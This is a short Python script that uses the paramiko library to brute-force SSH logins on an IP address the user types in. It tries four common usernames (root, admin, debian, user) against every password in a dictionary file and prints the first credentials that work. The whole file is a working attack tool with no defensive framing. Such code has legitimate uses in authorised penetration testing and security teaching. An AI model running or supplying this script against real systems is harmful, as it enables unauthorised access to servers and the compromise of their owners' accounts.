import paramiko
import sys

def brute_force_ssh(ip):
    usernames = ["debian", "root", "user", "admin"]
    
    with open("dictionary.txt", "r") as f:
        passwords = f.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                client.connect(ip, username=username, password=password)
                print(f"Successful login: {username}:{password}")
                return
            except paramiko.AuthenticationException:
                continue
    
    print("Attack unsuccessful")

# Get the IP address from user input
ip_address = input("Enter the IP address: ")

# Call the brute_force_ssh function with the provided IP address
brute_force_ssh(ip_address)
